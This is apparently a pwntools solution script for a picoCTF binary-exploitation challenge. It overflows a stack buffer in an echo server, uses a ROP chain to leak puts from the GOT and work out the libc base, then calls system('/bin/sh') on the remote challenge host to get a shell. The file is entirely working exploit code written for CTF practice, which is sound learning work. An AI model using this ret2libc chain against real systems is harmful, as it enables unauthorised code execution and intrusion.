#!/bin/usr/python3

from pwn import *

elf = context.binary = ELF("./vuln_patched")
context.log_level = "info"
context.delete_corefiles = True
context.terminal = ["tmux", "splitw", "-h"]
libc = ELF("./libc.so.6")
title = "WeLcOmE To mY EcHo sErVeR!\n"

# set gdb attach
def start():
	p = process("./vuln_patched")
	gdb.attach(p, gdbscript = '''
		b main
		continue
	''')
	return p

# find rip overflow offset 
io = process("./vuln_patched")
payload = cyclic(200)
io.sendlineafter(title, payload)
io.wait()
core = io.corefile

rsp = core.rsp
pattern = core.read(rsp, 4)
rip_offset = cyclic_find(pattern)
info("rip offset= %d", rip_offset)

# find libc puts offset
puts_offset = libc.symbols.puts

# find got plt
puts_plt = elf.plt.puts
puts_got = elf.got.puts
main_func = elf.symbols.main

# find rop chain
# goal: find puts got addr and use it to calculate the real libc address
# return to main to repeat the echo server
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

rop.call("puts", [puts_got])
rop.call(main_func)

#io = process("./vuln_patched")
io = remote("mercury.picoctf.net", 49464)
info("send first payload to find leak addr")
io.sendlineafter(title, flat({rip_offset: rop.chain()}))

# find leaked puts addr
info("io.recvline = %s", io.recvline())
leak = io.recvline(keepends = False)
info("leak = %s", leak)
leak = int.from_bytes(leak, byteorder = "little")
info("leak = %#x", leak)

# find all func physical addr
libc_base = leak - puts_offset
libc.address = libc_base
binsh_addr = next(libc.search(b'/bin/sh\x00'))

# make another rop chain
# add puts to align the 64 bits stack, we can choose other gadget to align it at all, such as ret gadget:)
rop = ROP(elf)
#rop.call("puts", [puts_got])
rop.raw(rop.find_gadget(["ret"])[0])
rop.call(libc.symbols.system, [binsh_addr])

payload = flat({
	rip_offset: rop.chain()
})

# remote
io.sendlineafter(title, payload)
io.interactive()




